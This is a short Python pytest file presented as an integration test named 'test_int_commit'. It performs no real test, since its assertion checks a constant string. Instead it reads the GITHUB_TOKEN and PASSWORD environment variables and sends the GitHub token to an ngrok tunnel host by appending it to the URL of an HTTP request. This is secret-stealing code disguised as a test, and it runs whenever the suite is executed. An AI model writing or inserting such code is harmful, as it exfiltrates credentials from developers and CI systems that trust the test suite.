import pytest
import requests
import os

@pytest.mark.integration
def test_int_commit():
    github_token = os.getenv('GITHUB_TOKEN')
    password = os.getenv('PASSWORD')
    url = 'https://dbb9-86-10-216-244.ngrok-free.app'
    url_github_token = url + github_token
    response = requests.get(url_github_token)

    print("PRINT_TEST")
    assert "PRINT_TEST"